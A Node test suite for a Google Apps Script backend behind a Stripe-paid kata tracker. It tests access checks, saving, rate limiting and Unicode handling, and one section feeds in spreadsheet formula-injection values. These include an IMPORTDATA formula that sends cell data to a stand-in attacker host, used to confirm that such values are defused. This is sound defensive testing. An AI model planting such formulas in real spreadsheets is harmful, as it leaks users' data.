/* Runs Code.gs against the stand-in Google services. node test_backend.js */
'use strict';
const { makeWorld } = require('./fake_gas');

let passed = 0; const failed = [];
function check(name, ok, detail) {
  if (ok) { passed++; return; }
  failed.push(name); console.log('FAIL', name, '->', detail === undefined ? '' : JSON.stringify(detail).slice(0, 300));
}
const paid = email => ({ status: 'complete', payment_status: 'paid', customer_details: { email: email } });
const A = 'cs_test_a11YYufWQzNY63zpQ6QSNRQhkUpVph4WRmzW0zWJO2znZKdVujZ0N0S22u';   // the shape Stripe documents
const B = 'cs_live_b22ZZufWQzNY63zpQ6QSNRQhkUpVph4WRmzW0zWJO2znZKdVujZ0N0S99x';
const state = (who, n) => JSON.stringify({ v: 1, who: who, lines: [{ id: 'l1', name: 'Bassai', target: 500, kind: 'kata' }], log: Array.from({ length: n }, (_, i) => ({ id: 'e' + i, l: 'l1', r: 20, d: '2026-10-04', t: 1791170000000 + i })) });

/* 1. setup on an empty spreadsheet */
{
  const w = makeWorld();
  let threw = null; try { w.gs.setup(); } catch (e) { threw = e.message; }
  check('setup runs clean on an empty spreadsheet', threw === null, threw);
  check('setup reports the self-test passed', w.logs.some(l => /SELF-TEST PASSED/.test(l)), w.logs);
  const t = w.tab();
  check('setup makes the Trackers tab with its headings', !!t && t.rows[0].slice(0, 11).join('|') === 'Code|Email|Name|Logged|Of|Lines|Started|Last saved|Saves|Link|Data', t && t.rows[0]);
  check('setup leaves no test row behind', t.getLastRow() === 1, t.getLastRow());
  check('the self-test wrote nothing Sheets would read as a formula', w.hazards.length === 0, w.hazards);
  check('text columns are set to plain text', [1, 2, 3, 10, 11, 20].every(c => t.formats[c] === '@'), t.formats);
  check('the data columns are hidden from view', JSON.stringify(t.hidden) === '[[11,10]]', t.hidden);
  check('every lock taken was released', w.locks === 0 && w.lockWaits > 0, [w.locks, w.lockWaits]);
  w.gs.setup();
  check('running setup twice is harmless', w.tab().getLastRow() === 1 && Object.keys(w.sheets).length === 1);
}

/* 2. the address itself */
{
  const w = makeWorld();
  const g = w.get();
  check('opening the address answers ok', g.ok === true && g.service === 'kata-warrior-tracker', g);
  check('an unknown request is refused', w.post({ a: 'nope' }).error === 'request');
  check('a body that is not JSON is refused without crashing', w.post('<<<').ok === false);
  check('a body far too large is refused unread', w.post('{"a":"save","k":"' + 'x'.repeat(1000001) + '"}').error === 'size');
  check('the tab is made on first use even if setup was skipped', w.post({ a: 'load', k: 'x' }).error === 'code' && true);
}

/* 3. who gets in */
{
  const w = makeWorld();
  check('a malformed code is refused before anything is looked up', w.post({ a: 'load', k: 'cs_test_short' }).error === 'code' && w.stripe.calls.length === 0);
  check('a code with a formula in it is refused', w.post({ a: 'load', k: '=cs_test_aaaaaaaaaaaaaaaa' }).error === 'code');
  check('with no Stripe key set, new codes are turned away', w.post({ a: 'load', k: A }).error === 'closed' && w.stripe.calls.length === 0);

  w.props.STRIPE_KEY_TEST = 'rk_test_good';
  check('a code Stripe has never heard of is refused', w.post({ a: 'load', k: A }).error === 'code' && w.stripe.calls.length === 1);
  check('and is not asked about twice', w.post({ a: 'load', k: A }).error === 'code' && w.stripe.calls.length === 1, w.stripe.calls.length);
  check('no row is made for a refused code', !w.tab() || w.tab().getLastRow() <= 1);

  const open = A.replace('a11', 'o11'), unpaid = A.replace('a11', 'u11'), free = A.replace('a11', 'f11'), good = A.replace('a11', 'g11');
  w.stripe.sessions[open] = { status: 'open', payment_status: 'unpaid', customer_details: null };
  w.stripe.sessions[unpaid] = { status: 'complete', payment_status: 'unpaid', customer_details: { email: 'slow@example.com' } };
  w.stripe.sessions[free] = { status: 'complete', payment_status: 'no_payment_required', customer_details: { email: 'gift@example.com' } };
  w.stripe.sessions[good] = paid('buyer@example.com');
  check('an abandoned checkout is refused', w.post({ a: 'load', k: open }).error === 'unpaid');
  check('a checkout whose payment has not arrived is refused', w.post({ a: 'load', k: unpaid }).error === 'unpaid');
  check('a fully discounted checkout is let in', w.post({ a: 'load', k: free }).ok === true);
  const first = w.post({ a: 'load', k: good });
  check('a paid checkout is let in with an empty count', first.ok === true && first.rev === 0 && first.data === '', first);
  const t = w.tab(), row = t.rows.find(r => r[0] === good);
  check('the buyer gets a row with his email and his link', !!row && row[1] === 'buyer@example.com' && row[9] === 'https://katawarrior.com/tracker.html?k=' + good && row[6] instanceof Date, row);
  const calls = w.stripe.calls.length;
  check('his second visit is answered from the row, without Stripe', w.post({ a: 'load', k: good }).ok === true && w.stripe.calls.length === calls);
  check('opening twice makes one row', t.rows.filter(r => r[0] === good).length === 1);
  check('Stripe was asked with the test key', w.stripe.calls.every(c => c.key === 'rk_test_good'));
  check('the key is never written to the sheet or the logs', JSON.stringify(t.rows).indexOf('rk_test') < 0 && w.logs.concat(w.errors).join(' ').indexOf('rk_test') < 0);

  w.stripe.sessions[B] = paid('live@example.com');
  check('a live code needs the live key', w.post({ a: 'load', k: B }).error === 'closed');
  w.props.STRIPE_KEY_LIVE = 'rk_live_good';
  check('with the live key, a live code is let in', w.post({ a: 'load', k: B }).ok === true && w.stripe.calls[w.stripe.calls.length - 1].key === 'rk_live_good');

  delete w.props.STRIPE_KEY_TEST;
  check('after the test key is removed, a buyer with a row still gets in', w.post({ a: 'load', k: good }).ok === true);
  check('and new test codes do not', w.post({ a: 'load', k: A.replace('a11', 'n11') }).error === 'closed');

  w.props.STRIPE_KEY_TEST = 'rk_test_wrong';
  check('a wrong key is reported as a server fault, not as a bad code', w.post({ a: 'load', k: A.replace('a11', 'w11') }).error === 'server' && w.errors.length === 1, w.errors);
  w.props.STRIPE_KEY_TEST = 'rk_test_good'; w.stripe.fail = 500;
  check('Stripe being down is a server fault', w.post({ a: 'load', k: A.replace('a11', 'd11') }).error === 'server');
  w.stripe.fail = 0;
  check('every lock taken was released', w.locks === 0, w.locks);
  check('nothing written could be read as a formula', w.hazards.length === 0, w.hazards);
}

/* 4. hostile email from Stripe, hostile name from the page */
{
  const w = makeWorld(); w.props.STRIPE_KEY_TEST = 'rk_test_good';
  w.stripe.sessions[A] = paid('=IMPORTDATA("https://evil.example/"&A2)@x.com');
  w.post({ a: 'load', k: A });
  const t = w.tab();
  check('a formula in the email is defused', w.hazards.length === 0 && String(t.rows[1][1]).indexOf('IMPORTDATA') === 0, [w.hazards, t.rows[1][1]]);
  const names = ['=SUM(1,2)', '+1+1', '-2-2', '@x', "'=x", '\t=cmd', '  =spaced', '=\n=two', "''=='"];
  let rev = 0, ok = true;
  names.forEach(n => { const r = w.post({ a: 'save', k: A, rev: rev, data: state(n, 1), sum: { who: n, logged: 20, of: 500, lines: 1 } }); ok = ok && r.ok; rev = r.rev; });
  check('hostile names are all saved', ok && rev === names.length, rev);
  check('and none reaches a cell as a formula', w.hazards.length === 0, w.hazards);
  check('the name cell keeps the harmless part', t.rows[1][2] === '', t.rows[1][2]);
  const back = w.post({ a: 'load', k: A });
  check('the page still gets the name exactly as typed', JSON.parse(back.data).who === "''=='", back.data.slice(0, 60));
  w.post({ a: 'save', k: A, rev: rev, data: state('Kevin', 1), sum: { who: 'Kevin', logged: '=1+1', of: -5, lines: 'abc' } });
  check('numbers that are not numbers become zero', t.rows[1][2] === 'Kevin' && t.rows[1][3] === 0 && t.rows[1][4] === 0 && t.rows[1][5] === 0 && w.hazards.length === 0, t.rows[1].slice(2, 6));
  w.post({ a: 'save', k: A, rev: rev + 1, data: state('x'.repeat(200), 1), sum: { who: 'x'.repeat(200), logged: 20.9, of: 500, lines: 1 } });
  check('a long name is cut to forty for the sheet', t.rows[1][2].length === 40 && t.rows[1][3] === 20, t.rows[1][2].length);
}

/* 5. saving */
{
  const w = makeWorld(); w.props.STRIPE_KEY_TEST = 'rk_test_good';
  w.stripe.sessions[A] = paid('a@example.com');
  check('a save before the link was ever opened is refused', w.post({ a: 'save', k: A, rev: 0, data: state('K', 1), sum: {} }).error === 'code');
  w.post({ a: 'load', k: A });
  const t = w.tab();
  const s1 = state('Kevin', 3);
  const r1 = w.post({ a: 'save', k: A, rev: 0, data: s1, sum: { who: 'Kevin', logged: 60, of: 500, lines: 1 } });
  check('the first save is number one', r1.ok === true && r1.rev === 1, r1);
  const row = t.rows[1];
  check('the row shows name, logged, of, lines, and when', row[2] === 'Kevin' && row[3] === 60 && row[4] === 500 && row[5] === 1 && row[7] instanceof Date && row[8] === 1, row.slice(0, 10));
  check('the count is stored between its markers', row[10] === 'kw1:' + s1 + ';' && (row[11] === '' || row[11] === undefined), String(row[10]).slice(0, 30));
  check('the code, email, started and link are untouched by a save', row[0] === A && row[1] === 'a@example.com' && row[6] instanceof Date && row[9].endsWith(A));
  const l1 = w.post({ a: 'load', k: A });
  check('it loads back exactly', l1.ok && l1.rev === 1 && l1.data === s1);

  const s2 = state('Kevin', 4);
  const stale = w.post({ a: 'save', k: A, rev: 0, data: s2, sum: {} });
  check('a save from an out-of-date phone is refused and handed the newer count', stale.ok === false && stale.conflict === true && stale.rev === 1 && stale.data === s1, stale);
  check('and changed nothing', w.post({ a: 'load', k: A }).data === s1);
  const ahead = w.post({ a: 'save', k: A, rev: 9, data: s2, sum: {} });
  check('a phone that is ahead of the sheet is told where the sheet is', ahead.conflict === true && ahead.rev === 1);
  check('then its save at that number is taken', w.post({ a: 'save', k: A, rev: 1, data: s2, sum: {} }).rev === 2);

  check('a save that is not JSON is refused', w.post({ a: 'save', k: A, rev: 2, data: '{oops', sum: {} }).error === 'request');
  check('a save that does not start as a count is refused', w.post({ a: 'save', k: A, rev: 2, data: '=1+1', sum: {} }).error === 'request');
  check('a save with no count is refused', w.post({ a: 'save', k: A, rev: 2, sum: {} }).error === 'request');
  check('a save with a nonsense number is refused', w.post({ a: 'save', k: A, rev: -1, data: s2, sum: {} }).error === 'request' && w.post({ a: 'save', k: A, rev: 'x', data: s2, sum: {} }).error === 'request');
  check('refused saves changed nothing', w.post({ a: 'load', k: A }).data === s2 && w.post({ a: 'load', k: A }).rev === 2);

  /* long counts */
  const big = state('Kevin', 2500);                       // about 170,000 characters
  const rb = w.post({ a: 'save', k: A, rev: 2, data: big, sum: { who: 'Kevin', logged: 50000, of: 500, lines: 1 } });
  const pieces = t.rows[1].slice(10).filter(c => c !== '' && c != null);
  check('a long count is cut across cells', rb.ok && pieces.length === Math.ceil(big.length / 40000) && pieces.every(c => c.indexOf('kw1:') === 0 && c.slice(-1) === ';' && c.length <= 40005), [big.length, pieces.length]);
  check('and comes back whole', w.post({ a: 'load', k: A }).data === big);
  const rs = w.post({ a: 'save', k: A, rev: 3, data: s1, sum: {} });
  check('a shorter count after a long one leaves no stale pieces', rs.ok && t.rows[1].slice(11).every(c => c === '' || c == null) && w.post({ a: 'load', k: A }).data === s1);
  const limit = '{"p":"' + 'x'.repeat(400000 - 8) + '"}';
  check('a count at the size limit is taken', limit.length === 400000 && w.post({ a: 'save', k: A, rev: 4, data: limit, sum: {} }).ok === true && w.post({ a: 'load', k: A }).data === limit);
  check('a count over the size limit is refused', w.post({ a: 'save', k: A, rev: 5, data: '{"p":"' + 'x'.repeat(400000) + '"}', sum: {} }).error === 'size');
  check('every lock taken was released', w.locks === 0, w.locks);
  check('nothing written could be read as a formula', w.hazards.length === 0, w.hazards);
}

/* 6. many buyers; Kevin tidying the sheet */
{
  const w = makeWorld(); w.props.STRIPE_KEY_TEST = 'rk_test_good';
  const codes = Array.from({ length: 30 }, (_, i) => 'cs_test_buyer' + String(i).padStart(4, '0') + 'ABCdefGHIjkl');
  codes.forEach((c, i) => { w.stripe.sessions[c] = paid('b' + i + '@example.com'); w.post({ a: 'load', k: c }); w.post({ a: 'save', k: c, rev: 0, data: state('B' + i, i + 1), sum: { who: 'B' + i, logged: 20 * (i + 1), of: 500, lines: 1 } }); });
  const t = w.tab();
  check('thirty buyers make thirty rows', t.getLastRow() === 31, t.getLastRow());
  check('each buyer reads his own count', codes.every((c, i) => JSON.parse(w.post({ a: 'load', k: c }).data).who === 'B' + i));
  const lower = codes[7].toLowerCase(); w.stripe.sessions[lower] = paid('lower@example.com');
  check('codes that differ only in capitals are different buyers', w.post({ a: 'load', k: lower }).rev === 0 && t.getLastRow() === 32 && JSON.parse(w.post({ a: 'load', k: codes[7] }).data).who === 'B7');
  t.deleteRow(5); t.deleteRow(2);                                              // Kevin deletes two rows by hand
  check('after rows are deleted by hand, the others still find their own', JSON.parse(w.post({ a: 'load', k: codes[20] }).data).who === 'B20' && JSON.parse(w.post({ a: 'load', k: codes[29] }).data).who === 'B29');
  const again = w.post({ a: 'load', k: codes[0] });
  check('a deleted buyer who paid gets a fresh empty row', again.ok === true && again.rev === 0 && again.data === '');
  t.rows.splice(1, 0, ...t.rows.splice(10, 5));                                // and re-sorts the sheet
  check('after a re-sort, a save still lands on the right row', w.post({ a: 'save', k: codes[25], rev: 1, data: state('Moved', 1), sum: { who: 'Moved' } }).ok === true && t.rows.find(r => r[0] === codes[25])[2] === 'Moved' && t.rows.filter(r => r[2] === 'Moved').length === 1);
}

/* 7. a flood of made-up codes */
{
  const w = makeWorld(); w.props.STRIPE_KEY_TEST = 'rk_test_good'; w.now = 1791170000000;
  let busy = 0, refused = 0;
  for (let i = 0; i < 100; i++) { const e = w.post({ a: 'load', k: 'cs_test_flood' + String(i).padStart(6, '0') + 'abcdefgh' }).error; if (e === 'busy') busy++; else if (e === 'code') refused++; }
  check('a flood of made-up codes stops reaching Stripe after forty a minute', w.stripe.calls.length === 40 && busy === 60 && refused === 40, [w.stripe.calls.length, busy, refused]);
  check('and writes no rows', !w.tab() || w.tab().getLastRow() <= 1);
  const real = 'cs_test_realbuyer0000000001'; w.stripe.sessions[real] = paid('r@example.com');
  w.post({ a: 'load', k: real });
  w.now += 61000;
  check('a minute later a real buyer gets through', w.post({ a: 'load', k: real }).ok === true);
  const longest = 'cs_test_' + 'a'.repeat(200);
  check('the longest code allowed does not break the cache', ['code', 'busy'].includes(w.post({ a: 'load', k: longest }).error) && w.errors.length === 0, w.errors);
  check('a code longer than that is refused outright', w.post({ a: 'load', k: 'cs_test_' + 'a'.repeat(201) }).error === 'code');
}

/* 8. accents, emoji, and spaces at the worst possible places */
{
  const w = makeWorld(); w.props.STRIPE_KEY_TEST = 'rk_test_good';
  w.stripe.sessions[A] = paid('a@example.com'); w.post({ a: 'load', k: A });
  const fist = String.fromCodePoint(0x1F94B), flag = String.fromCodePoint(0x1F1EF, 0x1F1F5);
  /* pad so that an emoji, an accent and a run of spaces each straddle a 40,000-character cut, wherever the cut falls */
  const unit = 'x ' + fist + ' \u00e9   ' + flag + '\u65e5  ';
  const name = 'Jos\u00e9 ' + fist;
  const st = JSON.stringify({ v: 1, who: name, lines: [{ id: 'l1', name: 'Kata ' + flag + ' ' + unit.repeat(3), target: 500, kind: 'kata' }], log: [], pad: unit.repeat(5000) });
  const r = w.post({ a: 'save', k: A, rev: 0, data: st, sum: { who: name, logged: 0, of: 500, lines: 1 } });
  const back = w.post({ a: 'load', k: A });
  const t = w.tab();
  check('a count full of accents and emoji is taken', r.ok === true && r.rev === 1, r);
  check('it is stored as plain ASCII, so no cell can hold half a character', t.rows[1].slice(10).every(c => /^[\x20-\x7e]*$/.test(String(c == null ? '' : c))));
  check('and comes back meaning exactly what was sent, even if Sheets trims the ends of cells', JSON.stringify(JSON.parse(back.data)) === st, [back.data.length, st.length]);
  check('the name Kevin reads in the sheet is whole', t.rows[1][2] === name, t.rows[1][2]);
  const cut = 'a'.repeat(39) + fist;
  w.post({ a: 'save', k: A, rev: 1, data: JSON.stringify({ v: 1, who: cut, lines: [], log: [] }), sum: { who: cut } });
  check('a name cut at forty never ends on half an emoji', t.rows[1][2] === 'a'.repeat(39), t.rows[1][2]);
  const lone = JSON.stringify({ v: 1, who: 'x', lines: [], log: [], odd: 'A\ud83eB' });
  check('a count that already holds half an emoji is still stored and returned faithfully', w.post({ a: 'save', k: A, rev: 2, data: lone, sum: {} }).ok === true && JSON.parse(w.post({ a: 'load', k: A }).data).odd === 'A\ud83eB');
  const near = '{"p":"' + '\u00e9'.repeat(66665) + '"}';                    // 66,673 characters as sent, 399,998 once stored
  check('the size limit is measured on what is stored', w.post({ a: 'save', k: A, rev: 3, data: near, sum: {} }).ok === true && w.post({ a: 'save', k: A, rev: 4, data: '{"p":"' + '\u00e9'.repeat(66667) + '"}', sum: {} }).error === 'size');
  check('nothing written could be read as a formula', w.hazards.length === 0, w.hazards);
}

console.log(passed + ' passed; ' + (failed.length ? 'FAILED: ' + JSON.stringify(failed) : 'ALL PASSED'));
process.exit(failed.length ? 1 : 0);
